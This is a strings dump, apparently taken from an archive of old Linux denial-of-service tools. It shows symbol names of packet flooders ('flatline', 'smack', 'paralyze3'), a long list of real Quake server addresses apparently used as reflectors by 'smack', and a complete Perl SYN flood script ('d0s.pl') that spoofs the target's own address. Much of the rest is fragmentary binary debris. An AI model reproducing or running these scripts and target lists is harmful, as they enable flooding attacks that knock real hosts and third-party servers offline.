            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "flatline.c",
            "srcport",
            "unlim",
            "dstport",
            "burst",
            "IGMP_HDR",
            "cloaking",
            "opensock",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "ICMP_HDR",
            "fork@@GLIBC_2.0",
            "IGMP_Size",
            "htonl@@GLIBC_2.0",
            "UNREACH_IP_HDR",
            "UDP_IP_HDR",
            "Setup_Packets",
            "UDP_HDR",
            "setgid@@GLIBC_2.0",
            "_init",
            "SYN_Packet",
            "ucode",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "parse_args",
            "SYN_IP_HDR",
            "stealth",
            "UNREACH_ICMP_HDR",
            "_start",
            "getopt@@GLIBC_2.0",
            "strlen@@GLIBC_2.0",
            "banner",
            "UDP_Packet",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "ICMP_Packet",
            "ICMP_IP_HDR",
            "IGMP_IP_HDR",
            "data_start",
            "UNREACH_Packet",
            "printf@@GLIBC_2.0",
            "SYN_TCP_HDR",
            "getuid@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "forknum",
            "SYN_Size",
            "getgid@@GLIBC_2.0",
            "resolvedest",
            "gethostbyname@@GLIBC_2.0",
            "etype",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "UDP_Size",
            "UNREACH_Size",
            "memset@@GLIBC_2.0",
            "eminsize",
            "optarg@@GLIBC_2.0",
            "numpacks",
            "_IO_stdin_used",
            "ICMP_Size",
            "dstaddr",
            "__data_start",
            "socket@@GLIBC_2.0",
            "uminsize",
            "rand@@GLIBC_2.0",
            "burstmode",
            "IGMP_Packet",
            "setuid@@GLIBC_2.0",
            "optind@@GLIBC_2.0",
            "target",
            "__gmon_start__",
            "strcpy@@GLIBC_2.0",
            "datapool/bin/smack",
            "0100755",
            "0000000",
            "0000000",
            "00000060427",
            "07100656675",
            "013201",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "memcpy",
            "perror",
            "socket",
            "bzero",
            "inet_addr",
            "__deregister_frame_info",
            "setsockopt",
            "rand",
            "sendto",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRh",
            "Pl T",
            "]UDSj",
            "\u04008 tgE",
            "\u04008:tP}",
            "E\u070bUM",
            "E\u050bUM",
            "ElEP",
            "EPEPEP",
            "u\t,&",
            "1fPW",
            "1fRx",
            "1fPE",
            "j(h`",
            "P+ T",
            "\u0403;u[]",
            "206.83.174.9:26000:0",
            "204.210.15.62:26001:0",
            "204.210.15.62:26000:0",
            "128.175.46.96:26000:0",
            "128.138.149.62:26000:0",
            "128.113.161.123:26000:0",
            "128.143.244.38:26000:0",
            "200.255.216.11:26000:0",
            "203.59.24.229:26000:0",
            "204.253.208.225:26000:0",
            "206.154.216.100:26000:0",
            "206.186.72.103:26000:0",
            "206.25.206.10:26000:0",
            "207.25.220.40:26000:0",
            "204.177.71.250:26000:0",
            "163.1.138.204:26000:0",
            "149.156.159.100:26000:0",
            "206.248.16.16:26002:0",
            "206.248.16.16:26001:0",
            "165.91.20.158:26000:0",
            "205.218.60.98:26000:0",
            "205.218.60.98:26001:0",
            "134.193.111.241:26500:0",
            "130.126.195.94:26000:0",
            "209.48.89.1:26000:0",
            "204.90.102.49:26000:0",
            "143.195.150.40:26000:0",
            "207.207.248.20:26000:0",
            "149.106.37.197:26000:0",
            "137.123.210.80:26000:0",
            "208.194.67.16:26012:0",
            "204.157.39.7:26000:0",
            "193.13.231.149:26000:0",
            "148.217.2.200:26000:0",
            "204.216.27.8:26000:0",
            "204.171.44.26:26000:0",
            "206.83.174.10:26000:0",
            "194.117.157.74:26000:0",
            "207.0.129.183:26000:0",
            "203.61.156.165:26000:0",
            "206.96.251.44:26000:0",
            "200.246.163.6:26000:0",
            "204.119.24.237:26000:0",
            "205.197.242.62:26000:0",
            "207.152.95.9:26000:0",
            "136.159.102.88:26000:0",
            "205.139.59.121:26000:0",
            "203.17.23.9:26000:0",
            "128.206.92.47:26000:0",
            "203.30.239.5:26000:0",
            "199.217.218.007:26000:0",
            "195.66.200.101:26000:0",
            "203.16.135.34:26000:0",
            "130.63.74.16:26000:0",
            "206.196.57.130:26001:0",
            "203.17.23.13:26000:0",
            "200.246.52.4:26000:0",
            "200.248.149.31:26000:0",
            "203.32.8.197:26000:0",
            "209.29.65.3:26000:0",
            "200.246.0.248:26000:0",
            "200.255.218.41:26000:0",
            "207.212.176.26:26000:0",
            "202.188.101.246:26000:0",
            "200.246.227.44:26000:0",
            "200.246.248.9:26000:0",
            "199.217.218.7:26000:0",
            "203.15.24.46:26000:0",
            "200.248.241.2:26000:0",
            "195.224.47.44:26000:0",
            "195.94.179.25:26000:0",
            "200.255.96.24:26000:0",
            "200.246.5.28:26000:0",
            "206.25.117.125:26000:0",
            "206.230.102.9:26000:0",
            "196.25.1.132:26000:0",
            "202.49.244.17:26000:0",
            "206.41.136.94:26000:0",
            "203.29.160.21:26000:0",
            "200.250.234.39:26000:0",
            "131.151.52.105:26000:0",
            "203.17.103.34:26000:0",
            "200.248.241.1:26000:0",
            "200.18.178.14:26000:0",
            "203.23.237.110:26000:0",
            "195.94.179.5:26000:0",
            "195.90.193.138:26000:0",
            "203.61.156.164:26000:0",
            "203.61.156.162:26000:0",
            "203.55.240.1:26000:0",
            "195.74.0.69:26000:0",
            "207.78.244.40:26000:0",
            "139.174.248.165:26000:0",
            "130.237.233.111:26000:0",
            "194.125.148.2:26000:0",
            "200.241.93.2:26000:0",
            "194.204.5.25:26000:0",
            "202.27.184.4:26000:0",
            "194.19.128.13:26000:0",
            "194.243.65.2:26000:0",
            "129.13.209.22:26000:0",
            "207.48.50.10:26000:0",
            "130.241.142.10:26000:0",
            "203.19.214.28:26000:0",
            "194.64.176.5:26000:0",
            "207.53.96.12:26000:0",
            "192.89.182.26:26000:0",
            "206.20.111.7:26000:0",
            "200.18.178.7:26000:0",
            "193.13.231.151:26000:0",
            "150.156.210.232:26000:0",
            "193.164.183.3:26000:0",
            "195.238.2.30:26000:0",
            "206.251.130.20:26000:0",
            "132.230.153.50:26000:0",
            "206.112.1.31:26000:0",
            "194.213.72.22:26000:0",
            "200.241.222.88:26000:0",
            "209.90.128.16:26000:0",
            "205.164.220.20:26000:0",
            "130.240.195.72:26000:0",
            "129.15.3.37:26000:0",
            "193.74.114.41:26000:0",
            "205.139.35.22:26000:0",
            "202.218.50.24:26000:0",
            "198.161.102.18:26000:0",
            "207.106.42.14:26000:0",
            "207.243.123.2:26000:0",
            "207.0.164.8:26000:0",
            "169.197.1.154:26000:0",
            "167.114.26.50:26000:0",
            "148.202.1.5:26000:0",
            "130.234.16.21:26000:0",
            "206.183.143.4:26000:0",
            "128.253.185.87:26000:0",
            "129.21.112.194:26000:0",
            "18.238.0.24:26000:0",
            "194.109.6.218:26000:0",
            "194.143.8.153:26000:0",
            "195.173.25.34:26000:0",
            "132.235.197.72:26000:0",
            "136.201.40.50:26000:0",
            "147.83.61.32:26000:0",
            "194.144.237.50:26000:0",
            "208.201.224.211:26000:0",
            "205.216.83.5:26000:0",
            "207.201.91.8:26000:0",
            "207.51.86.22:26000:0",
            "194.229.154.41:26000:0",
            "129.128.54.168:26000:0",
            "207.239.212.244:26000:0",
            "206.149.80.99:26000:0",
            "208.0.122.11:26000:0",
            "151.198.193.6:26000:0",
            "195.18.128.10:26000:0",
            "206.230.18.20:26000:0",
            "207.239.212.107:26000:0",
            "204.220.36.31:26000:0",
            "206.147.58.45:26000:0",
            "208.153.58.17:26000:0",
            "194.239.134.18:26000:0",
            "199.76.206.54:26000:0",
            "206.53.116.243:26000:0",
            "208.0.122.12:26000:0",
            "128.163.161.105:26000:0",
            "128.230.33.90:26000:0",
            "204.216.126.250:26000:0",
            "205.228.248.27:26000:0",
            "194.42.225.247:26000:0",
            "207.65.218.15:26000:0",
            "207.3.64.52:26000:0",
            "140.180.143.197:26000:0",
            "204.171.58.6:26000:0",
            "206.196.153.201:26000:0",
            "207.96.243.5:26000:0",
            "208.212.201.9:26000:0",
            "207.13.5.18:26000:0",
            "156.46.147.17:26000:0",
            "198.17.249.14:26000:0",
            "165.91.21.113:26000:0",
            "171.64.65.70:26000:0",
            "192.124.43.73:26000:0",
            "204.177.184.31:26000:0",
            "205.199.137.12:26000:0",
            "206.154.138.8:26000:0",
            "209.98.3.217:26000:0",
            "199.72.175.156:26000:0",
            "192.124.43.75:26000:0",
            "207.99.85.69:26000:0",
            "205.217.206.189:26000:0",
            "24.3.132.9:26000:0",
            "165.166.140.111:26000:0",
            "207.87.203.28:26000:0",
            "204.248.210.20:26000:0",
            "165.166.140.160:26000:0",
            "207.207.32.130:26000:0",
            "24.1.226.74:26000:0",
            "198.161.102.213:26000:0",
            "207.87.203.20:26000:0",
            "207.18.86.50:26000:0",
            "207.23.43.3:26000:0",
            "206.31.102.16:26000:0",
            "206.196.57.130:26000:0",
            "35.8.144.96:26000:0",
            "198.83.6.70:26000:0",
            "141.219.83.69:26000:0",
            "203.87.2.13:26000:0",
            "194.158.161.28:26000:0",
            "194.100.105.71:26000:0",
            "206.98.138.165:26000:0",
            "129.2.237.36:26000:0",
            "128.164.141.5:26000:0",
            "209.144.56.16:26000:0",
            "207.172.7.66:26000:0",
            "205.177.27.190:26000:0",
            "205.219.23.3:26000:0",
            "129.15.3.39:26000:0",
            "143.44.100.20:26000:0",
            "193.88.50.50:26001:0",
            "130.236.249.227:26000:0",
            "198.164.230.15:26000:0",
            "195.170.128.5:26000:0",
            "159.134.244.133:26000:0",
            "207.171.0.68:26002:0",
            "204.209.212.5:26000:0",
            "198.87.96.254:26000:0",
            "128.2.74.204:26000:0",
            "206.98.138.166:26000:0",
            "18.238.0.24:26002:0",
            "199.247.126.23:26000:0",
            "205.189.151.3:26000:0",
            "140.180.143.197:26666:0",
            "208.137.128.24:26020:0",
            "208.203.244.13:26000:0",
            "141.219.81.85:26000:0",
            "208.137.139.8:26000:0",
            "140.247.155.208:26000:0",
            "18.238.0.24:26001:0",
            "128.2.237.78:26002:0",
            "129.21.114.129:26666:0",
            "204.49.131.19:26666:0",
            "128.52.38.15:26000:0",
            "207.175.30.130:26123:0",
            "207.173.16.53:26000:0",
            "204.177.39.44:26000:0",
            "38.156.101.2:26000:0",
            "199.67.51.101:26000:0",
            "206.129.112.27:26000:0",
            "195.74.96.45:26000:0",
            "129.21.113.71:26000:0",
            "128.2.237.78:26000:0",
            "208.225.207.3:26001:0",
            "171.64.65.70:26666:0",
            "208.225.207.3:26666:0",
            "207.254.73.2:26000:0",
            "128.2.237.78:26003:0",
            "128.2.237.78:26001:0",
            "128.95.25.184:26666:0",
            "165.91.3.91:26000:0",
            "207.239.212.113:26000:0",
            "198.106.166.188:26000:0",
            "209.49.51.98:26020:0",
            "195.162.196.42:26000:0",
            "207.236.41.30:26000:0",
            "194.109.6.217:26000:0",
            "207.218.51.13:26000:0",
            "140.233.207.207:26000:0",
            "204.177.71.10:26000:0",
            "200.241.188.3:26000:0",
            "206.248.16.16:26000:0",
            "206.154.148.145:26000:0",
            "207.166.192.85:26000:0",
            "199.217.218.8:26000:0",
            "207.170.48.24:26000:0",
            "24.0.147.54:26000:0",
            "204.97.179.4:26000:0",
            "204.202.54.95:26000:0",
            "194.65.5.103:26000:0",
            "131.111.226.98:26000:0",
            "209.12.170.11:26000:0",
            "207.206.65.5:26000:0",
            "204.216.126.251:26000:0",
            "204.254.98.11:26000:0",
            "207.8.164.27:26000:0",
            "204.141.86.42:26000:0",
            "147.188.209.113:26000:0",
            "206.149.144.14:26000:0",
            "132.230.63.23:26000:0",
            "209.172.129.66:26000:0",
            "207.99.85.67:26000:0",
            "204.213.176.8:26000:0",
            "207.65.182.12:26000:0",
            "206.246.194.15:26000:0",
            "160.45.32.176:26000:0",
            "207.67.188.25:26000:0",
            "194.109.6.220:26000:0",
            "206.191.0.209:26000:0",
            "204.91.237.250:26000:0",
            "199.72.175.4:26000:0",
            "204.216.57.249:26000:0",
            "38.233.80.136:26000:0",
            "165.166.140.140:26000:0",
            "207.114.144.200:26000:0",
            "199.67.51.102:26000:0",
            "204.49.131.19:26000:0",
            "209.155.24.25:26000:0",
            "193.88.50.50:26000:0",
            "204.210.15.71:26001:0",
            "128.252.22.47:26000:0",
            "165.166.144.45:26000:0",
            "204.253.208.245:26000:0",
            "207.13.110.4:26000:0",
            "171.64.65.70:26004:0",
            "207.64.79.1:26000:0",
            "208.134.73.42:26000:0",
            "194.229.103.195:26000:0",
            "144.92.111.117:26000:0",
            "144.92.243.243:26000:0",
            "204.170.191.6:26000:0",
            "38.241.229.103:26000:0",
            "207.126.70.69:26000:0",
            "208.130.10.26:26000:0",
            "207.206.116.41:26000:0",
            "204.254.98.15:26000:0",
            "205.139.62.15:26000:0",
            "206.246.194.16:26000:0",
            "208.4.5.9:26000:0",
            "206.171.181.1:26000:0",
            "194.126.80.142:26000:0",
            "192.52.220.101:26000:0",
            "200.24.34.116:26000:0",
            "34.224.14.118:26000:0",
            "205.23.45.223:26000:0",
            "203.45.23.123:26000:0",
            "198.101.39.41:26000:0",
            "204.210.15.71:26000:0",
            "129.186.121.53:26000:0",
            "207.30.184.9:26000:0",
            "200.255.244.2:26000:0",
            "199.202.71.203:26000:0",
            "144.92.229.122:26000:0",
            "207.19.125.13:26000:0",
            "165.166.140.122:26000:0",
            "207.239.192.51:26000:0",
            "203.23.47.43:26000:0",
            "208.45.42.111:26000:0",
            "200.34.211.10:26000:0",
            "208.23.24.79:26000:0",
            "209.122.33.45:26000:0",
            "198.106.23.1:26000:0",
            "208.137.128.24:26000:0",
            "208.0.188.6:26000:0",
            "208.18.129.2:26000:0",
            "62.136.15.45:26000:0",
            "209.36.105.50:26000:0",
            "209.30.67.88:26000:0",
            "195.96.122.8:26000:0",
            "159.134.244.132:26000:0",
            "209.192.31.148:26000:0",
            "208.240.197.32:26000:0",
            "208.255.165.53:26000:0",
            "148.176.238.89:26000:0",
            "207.198.211.22:26000:0",
            "206.103.0.200:26000:0",
            "216.65.157.101:26000:0",
            "12.72.1.37:26000:0",
            "199.247.156.6:26000:0",
            "205.163.58.20:26000:0",
            "208.194.67.16:26000:0",
            "209.26.6.121:26000:0",
            "207.40.196.13:26000:0",
            "134.193.111.241:26000:0",
            "206.98.138.162:26000:0",
            "194.125.2.219:26001:0",
            "207.229.129.193:26000:0",
            "209.51.192.228:26000:0159.134.244.134:26000:0",
            "137.48.127.127:26000:0",
            "134.147.141.98:26000:0",
            "209.12.13.20:26000:0",
            "146.227.105.5:26000:0",
            "200.239.253.14:26000:0",
            "144.92.218.112:26000:0",
            "209.112.14.200:26000:0",
            "209.51.213.12:26000:0",
            "128.52.42.22:26000:0",
            "157.182.246.58:26000:0",
            "192.107.41.7:26000:0",
            "129.15.3.38:26002:0",
            "129.15.3.38:26001:0",
            "207.123.126.4:26000:0",
            "129.15.3.38:26000:0",
            "Usage: ./smack <target to fuck>",
            "Slinging Packets.....",
            "Invalid source IP: %s",
            "socket",
            "setsockopt",
            "UnFed.",
            "Invalid destination IP: %s",
            "sendto",
            "QUAKE",
            "connect \"\\noaim\\0\\msg\\1\\rate\\2500\\bottomcolor\\1b\\topcolor\\name\\Snoopy\"",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "smack.c",
            "conn_pack1",
            "_DYNAMIC",
            "parse_in",
            "servers",
            "addserv",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "udph",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "conn_pack0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "_start",
            "strlen@@GLIBC_2.0",
            "read_data",
            "addr",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "pack",
            "__gmon_start__",
            "datapool/bin/d0s.pl",
            "0100755",
            "0000000",
            "0000000",
            "00000001400",
            "07077137326",
            "013165",
            "ustar  ",
            "root",
            "root",
            "#!/usr/bin/perl -w",
            "# Syn DoS by ragnarox",
            "# (phedz.org && r00tabega.com)",
            "# 04/12/00  (5:17pm)  hehe",
            "# This program requires Net::RawIP which can be downloaded from",
            "# http://search.cpan.org/ .",
            "# Its like.. GNU and shit too.  heh",
            "require 'getopts.pl';",
            "use Net::RawIP;",
            "Getopts('i:p:n:');",
            "$a = new Net::RawIP;",
            "die \"Usage $0 -i <target> -p <target port> -n <number of times>\\nBy ragnarox\"",
            "unless ($opt_i && $opt_p && $opt_n);",
            "$a->set({ ip => {saddr => $opt_i,",
            "\t\t daddr => $opt_i",
            "\t\t},",
            "\t tcp => {dest => $opt_p,",
            "\t         source => $opt_p,",
            "\t\t psh => 1,",
            "\t\t syn => 1}",
            "\t});",
            "for($x=0;$x<=$opt_n;$x++) {",
            "$a->send;",
            "print \"\\npHEAR!\";",
            "print \"\\n\\nTarget: $opt_i\";",
            "print \"\\nPort: $opt_p\";",
            "print \"\\nAttacks: $opt_n\\n\\n\";",
            "print \"\\nragnarox  (phedz.org && r00tabega.com)\\n\";",
            "datapool/bin/paralyze3",
            "0100755",
            "0000000",
            "0000000",
            "00000035443",
            "07100656655",
            "014013",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "stdout",
            "connect",
            "getpid",
            "memcpy",
            "perror",
            "puts",
            "optarg",
            "socket",
            "fflush",
            "alarm",
            "fprintf",
            "kill",
            "__deregister_frame_info",
            "signal",
            "fork",
            "getopt",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh4",
            "j\tXP",
            "]UDSE",
            "kEtt3t",
            "?tAL&",
            "EPh\u038e",
            "EPh\u078e",
            "PE\u040dP",
            "1fEP",
            "fE\u0483h@",
            "E;E|",
